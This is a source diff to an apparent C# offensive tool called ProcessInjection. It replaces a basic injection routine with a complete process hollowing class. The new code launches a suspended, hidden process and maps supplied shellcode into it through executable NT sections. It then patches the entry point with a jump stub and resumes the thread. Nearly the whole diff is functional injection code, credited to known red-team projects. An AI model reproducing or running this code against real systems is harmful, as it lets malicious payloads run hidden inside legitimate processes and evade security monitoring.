@@ -38,17 +38,35 @@ namespace ProcessInjection
         #endregion DLL Injection
 
         #region Process Hollowing
-        [DllImport("kernel32.dll")]
-        static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
+        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+        public static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, MemProtect pageProt, MemAllocation allocationAttribs, IntPtr hFile);
 
-        [DllImport("kernel32.dll")]
-        static extern uint SuspendThread(IntPtr hThread);
+        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
+        private static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);
 
-        [DllImport("kernel32.dll")]
-        static extern int ResumeThread(IntPtr hThread);
+        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+        public static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, MemAllocation alloctype, MemProtect prot);
 
-        [DllImport("ntdll.dll", SetLastError = true)]
-        private static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
+        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
+        private static extern IntPtr GetCurrentProcess();
+
+        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+        public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+
+        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumWritten);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern uint ResumeThread(IntPtr hThread);
+
+        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+        private static extern int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address);
+
+        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
+        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);
         #endregion Process Hollowing
 
         //http://www.pinvoke.net/default.aspx/kernel32/OpenProcess.html
@@ -76,6 +94,7 @@ namespace ProcessInjection
             MEM_RESERVE = 0x00002000,
             MEM_RESET = 0x00080000,
             MEM_RESET_UNDO = 0x1000000,
+            SecCommit = 0x08000000
         }
 
         //https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
@@ -105,6 +124,115 @@ namespace ProcessInjection
             SUSPEND_RESUME = 0x0002,
         }
 
+        #region Process Hollowing Structs
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_BASIC_INFORMATION
+        {
+            public IntPtr Reserved1;
+            public IntPtr PebAddress;
+            public IntPtr Reserved2;
+            public IntPtr Reserved3;
+            public IntPtr UniquePid;
+            public IntPtr MoreReserved;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct STARTUPINFO
+        {
+            public uint cb;
+            public IntPtr lpReserved;
+            public IntPtr lpDesktop;
+            public IntPtr lpTitle;
+            public uint dwX;
+            public uint dwY;
+            public uint dwXSize;
+            public uint dwYSize;
+            public uint dwXCountChars;
+            public uint dwYCountChars;
+            public uint dwFillAttributes;
+            public uint dwFlags;
+            public ushort wShowWindow;
+            public ushort cbReserved;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdErr;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SYSTEM_INFO
+        {
+            public uint dwOem;
+            public uint dwPageSize;
+            public IntPtr lpMinAppAddress;
+            public IntPtr lpMaxAppAddress;
+            public IntPtr dwActiveProcMask;
+            public uint dwNumProcs;
+            public uint dwProcType;
+            public uint dwAllocGranularity;
+            public ushort wProcLevel;
+            public ushort wProcRevision;
+        }
+
+        [StructLayout(LayoutKind.Sequential, Pack = 1)]
+        public struct LARGE_INTEGER
+        {
+            public uint LowPart;
+            public int HighPart;
+        }
+        #endregion End of Process Hollowing Structs
+        /*
+        #region Process Hollowing Flags
+        [Flags]
+        public enum CreationFlags
+        {
+            CreateSuspended = 0x00000004,
+            DetachedProcesds = 0x00000008,
+            CreateNoWindow = 0x08000000,
+            ExtendedStartupInfoPresent = 0x00080000
+        }
+
+        [Flags]
+        public enum AllocationType
+        {
+            Commit = 0x1000,
+            Reserve = 0x2000,
+            Decommit = 0x4000,
+            Releae = 0x8000,
+            Reset = 0x80000,
+            Physical = 0x400000,
+            TopDown = 0x100000,
+            WriteWatch = 0x200000,
+            LargePages = 0x20000000,
+            SecCommit = 0x08000000
+        }
+
+        [Flags]
+        public enum MemoryProtection
+        {
+            Execute = 0x10,
+            ExecuteRead = 0x20,
+            ExecuteReadWrite = 0x40,
+            ExecuteWriteCopy = 0x80,
+            NoAccess = 0x01,
+            ReadOnly = 0x02,
+            ReadWrite = 0x04,
+            WriteCopy = 0x08,
+            GuardModifierflag = 0x100,
+            NoCacheModifierflag = 0x200,
+            WriteCombineModifierflag = 0x400
+        }
+        #endregion End of Process Hollowing Flags
+        */
 
         public static byte[] StringToByteArray(string hex)
         {
@@ -203,67 +331,293 @@ namespace ProcessInjection
             }
         }
 
-        public static void ProcHollowing(string proc, byte[] buf)
+        public class ProcHollowing
         {
-            try
+            /*
+            Credits goes to Aaron - https://github.com/ambray,  Michael Gorelik<smgorelik@gmail.com> and @_RastaMouse
+            https://github.com/ambray/ProcessHollowing
+            https://gist.github.com/smgorelik/9a80565d44178771abf1e4da4e2a0e75
+            https://github.com/rasta-mouse/TikiTorch/blob/master/TikiLoader/Hollower.cs
+            */
+
+            IntPtr section_;
+            IntPtr localmap_;
+            IntPtr remotemap_;
+            IntPtr localsize_;
+            IntPtr remotesize_;
+            IntPtr pModBase_;
+            IntPtr pEntry_;
+            uint rvaEntryOffset_;
+            uint size_;
+            byte[] inner_;
+            public const uint CreateSuspended = 0x00000004;
+            public const uint DetachedProcess = 0x00000008;
+            public const uint CreateNoWindow = 0x08000000;
+            private const ulong PatchSize = 0x10;
+
+            public uint round_to_page(uint size)
             {
-                ProcessStartInfo startInfo = new ProcessStartInfo();
-                startInfo.FileName = proc;
-                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                Process holproc = new Process();
-                holproc.StartInfo = startInfo;
-                holproc.Start();
-                Console.WriteLine($"[+] Process {proc} started in background.");
+                SYSTEM_INFO info = new SYSTEM_INFO();
 
-                // https://stackoverflow.com/questions/71257/suspend-process-in-c-sharp
-                foreach (ProcessThread thread in holproc.Threads)
+                GetSystemInfo(ref info);
+
+                return (info.dwPageSize - size % info.dwPageSize) + size;
+            }
+
+            private bool nt_success(long v)
+            {
+                return (v >= 0);
+            }
+
+            public IntPtr GetCurrent()
+            {
+                return GetCurrentProcess();
+            }
+
+            private IntPtr GetBuffer()
+            {
+                return localmap_;
+            }
+
+
+            public static PROCESS_INFORMATION StartProcess(string binaryPath)
+            {
+                uint flags = CreateSuspended | DetachedProcess | CreateNoWindow;
+
+                STARTUPINFO startInfo = new STARTUPINFO();
+                PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
+                CreateProcess((IntPtr)0, binaryPath, (IntPtr)0, (IntPtr)0, false, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo);
+                Console.WriteLine($"[+] Process {binaryPath} started in a suspended state.");
+
+                return procInfo;
+            }
+
+            /*
+            https://github.com/peperunas/injectopi/tree/master/CreateSection
+            Attemp to create executatble section
+            */
+            private bool CreateSection(uint size)
+            {
+                LARGE_INTEGER liVal = new LARGE_INTEGER();
+                size_ = round_to_page(size);
+                liVal.LowPart = size_;
+
+                var status = ZwCreateSection(ref section_, 0x10000000, (IntPtr)0, ref liVal, MemProtect.PAGE_EXECUTE_READWRITE, MemAllocation.SecCommit, (IntPtr)0);
+                Console.WriteLine($"[+] Executable section created.");
+                return nt_success(status);
+            }
+
+            private KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, MemProtect protect, IntPtr addr)
+            {
+                IntPtr baseAddr = addr;
+                IntPtr viewSize = (IntPtr)size_;
+
+                var status = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);
+                return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
+            }
+
+            private void SetLocalSection(uint size)
+            {
+                var vals = MapSection(GetCurrent(), MemProtect.PAGE_READWRITE, IntPtr.Zero);
+                Console.WriteLine($"[+] Map view section to the current process: {vals}.");
+                localmap_ = vals.Key;
+                localsize_ = vals.Value;
+            }
+
+            private void CopyShellcode(byte[] buf)
+            {
+                var lsize = size_;
+                Console.WriteLine($"[+] Copying Shellcode into section: {lsize}. ");
+
+                unsafe
                 {
-                    IntPtr OpenProc;
-                    OpenProc = OpenThread((uint)MemOpenThreadAccess.SUSPEND_RESUME, false, (uint)thread.Id);
-                    if (OpenProc == null)
+                    byte* p = (byte*)localmap_;
+
+                    for (int i = 0; i < buf.Length; i++)
                     {
-                        break;
+                        p[i] = buf[i];
                     }
-                    SuspendThread(OpenProc);
                 }
-                Console.WriteLine($"[+] Process {proc} has been Suspended.");
-                IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)holproc.Id);
-                Console.WriteLine($"[+] Handle {pHandle} opened for the process {proc}.");
-                IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
-                Console.WriteLine($"[+] Memory for injecting shellcode is allocated at 0x{rMemAddress}.");
-                uint lpNumberOfBytesWritten = 0;
-                if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))
-                {
-                    Console.WriteLine($"[+] Writing the shellcode at the allocated memory location.");
-                    uint threadId = 0;
-                    Console.WriteLine($"[+] Creating remote thread to execute the shellcode.");
-                    IntPtr hRemoteThread = CreateRemoteThread(pHandle, new IntPtr(0), new uint(), rMemAddress, new IntPtr(0), new uint(), ref threadId);
+            }
 
-                    foreach (ProcessThread thread in holproc.Threads)
+            private KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
+            {
+                int i = 0;
+                IntPtr ptr;
+
+                ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);
+                Console.WriteLine($"[+] Preparing shellcode patch for the new process entry point: {ptr}. ");
+
+                unsafe
+                {
+                    
+                    var p = (byte*)ptr;
+                    byte[] tmp = null;
+
+                    if (IntPtr.Size == 4)
                     {
-                        IntPtr OpenProc;
-                        OpenProc = OpenThread((uint)MemOpenThreadAccess.SUSPEND_RESUME, false, (uint)thread.Id);
-                        if (OpenProc == null)
-                        {
-                            break;
-                        }
-                        ResumeThread(OpenProc);
+                        p[i] = 0xb8;
+                        i++;
+                        var val = (Int32)dest;
+                        tmp = BitConverter.GetBytes(val);
                     }
-                    Console.WriteLine($"[+] Process has been resumed.");
-                    Console.WriteLine($"[+] Sucessfully injected the shellcode into the memory of the process {proc}.");
+                    else
+                    {
+                        p[i] = 0x48;
+                        i++;
+                        p[i] = 0xb8;
+                        i++;
+
+                        var val = (Int64)dest;
+                        tmp = BitConverter.GetBytes(val);
+                    }
+
+                    for (int j = 0; j < IntPtr.Size; j++)
+                        p[i + j] = tmp[j];
+
+                    i += IntPtr.Size;
+                    p[i] = 0xff;
+                    i++;
+                    p[i] = 0xe0;
+                    i++;
+                    
+                }
+
+                return new KeyValuePair<int, IntPtr>(i, ptr);
+            }
+
+            private IntPtr GetEntryFromBuffer(byte[] buf)
+            {
+                Console.WriteLine($"[+] Locating the entry point for the main module in remote process.");
+                IntPtr res = IntPtr.Zero;
+                unsafe
+                {
+                    fixed (byte* p = buf)
+                    {
+                        uint e_lfanew_offset = *((uint*)(p + 0x3c));
+
+                        byte* nthdr = (p + e_lfanew_offset);
+
+                        byte* opthdr = (nthdr + 0x18);
+
+                        ushort t = *((ushort*)opthdr);
+
+                        byte* entry_ptr = (opthdr + 0x10);
+
+                        var tmp = *((int*)entry_ptr);
+
+                        rvaEntryOffset_ = (uint)tmp;
+
+                        if (IntPtr.Size == 4)
+                            res = (IntPtr)(pModBase_.ToInt32() + tmp);
+                        else
+                            res = (IntPtr)(pModBase_.ToInt64() + tmp);
+
+                    }
+                }
+
+                pEntry_ = res;
+                return res;
+            }
+
+            private IntPtr FindEntry(IntPtr hProc)
+            {
+                var basicInfo = new PROCESS_BASIC_INFORMATION();
+                uint tmp = 0;
+
+                var success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
+                Console.WriteLine($"[+] Locating the module base address in the remote process.");
+
+                IntPtr readLoc = IntPtr.Zero;
+                var addrBuf = new byte[IntPtr.Size];
+                if (IntPtr.Size == 4)
+                {
+                    readLoc = (IntPtr)((Int32)basicInfo.PebAddress + 8);
                 }
                 else
                 {
-                    Console.WriteLine($"[+] Failed to inject the shellcode into the memory of the process {proc}.");
+                    readLoc = (IntPtr)((Int64)basicInfo.PebAddress + 16);
                 }
 
+                IntPtr nRead = IntPtr.Zero;
+
+                ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead);
+
+                if (IntPtr.Size == 4)
+                    readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
+                else
+                    readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
+
+                pModBase_ = readLoc;
+                ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead);
+                Console.WriteLine($"[+] Read the first page and locate the entry point: {readLoc}.");
+
+                return GetEntryFromBuffer(inner_);
             }
-            catch (Exception ex)
+
+            public void MapAndStart(PROCESS_INFORMATION pInfo)
             {
-                Console.WriteLine("[+] " + Marshal.GetExceptionCode());
-                Console.WriteLine(ex.Message);
+                var tmp = MapSection(pInfo.hProcess, MemProtect.PAGE_EXECUTE_READ, IntPtr.Zero);
+                Console.WriteLine($"[+] Locate shellcode into the suspended remote porcess: {tmp}.");
+
+                remotemap_ = tmp.Key;
+                remotesize_ = tmp.Value;
+
+                var patch = BuildEntryPatch(tmp.Key);
+
+                try
+                {
+                    var pSize = (IntPtr)patch.Key;
+                    IntPtr tPtr = new IntPtr();
+
+                    WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr);
+                }
+                finally
+                {
+                    if (patch.Value != IntPtr.Zero)
+                        Marshal.FreeHGlobal(patch.Value);
+                }
+
+                var tbuf = new byte[0x1000];
+                var nRead = new IntPtr();
+
+                ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead);
+                var res = ResumeThread(pInfo.hThread);
+                Console.WriteLine($"[+] Process has been resumed.");
             }
+
+            ~ProcHollowing()
+           {
+                Console.WriteLine($"[+] Unmap view section.");
+                if (localmap_ != (IntPtr)0)
+                   ZwUnmapViewOfSection(section_, localmap_);
+            }
+
+            public void Hollow(string binary, byte[] shellcode)
+            {
+                var pinf = StartProcess(binary);
+
+                FindEntry(pinf.hProcess);
+                CreateSection((uint)shellcode.Length);
+                SetLocalSection((uint)shellcode.Length);
+                CopyShellcode(shellcode);
+                MapAndStart(pinf);
+                CloseHandle(pinf.hThread);
+                CloseHandle(pinf.hProcess);
+            }
+
+            public ProcHollowing()
+            {
+                section_ = new IntPtr();
+                localmap_ = new IntPtr();
+                remotemap_ = new IntPtr();
+                localsize_ = new IntPtr();
+                remotesize_ = new IntPtr();
+                inner_ = new byte[0x1000];
+            }
+
         }
+
 
         public static void logo()
         {
@@ -368,7 +722,7 @@ namespace ProcessInjection
                         procid = Convert.ToInt32(arguments["/pid"]);
                         Process process = Process.GetProcessById(procid);
                     }
-                    if (System.IO.File.Exists(arguments["/path"]) && System.IO.File.Exists(arguments["/ppath"]))
+                    if (System.IO.File.Exists(arguments["/path"]))
                     {
                         if (arguments["/t"] == "1")
                         {
@@ -410,7 +764,8 @@ namespace ProcessInjection
                             {
                                 buf = convertfromc(shellcode);
                             }
-                            ProcHollowing(arguments["/ppath"], buf);
+                            ProcHollowing prochollow = new ProcHollowing();
+                            prochollow.Hollow(arguments["/ppath"], buf);
                         }
                     }
                     else
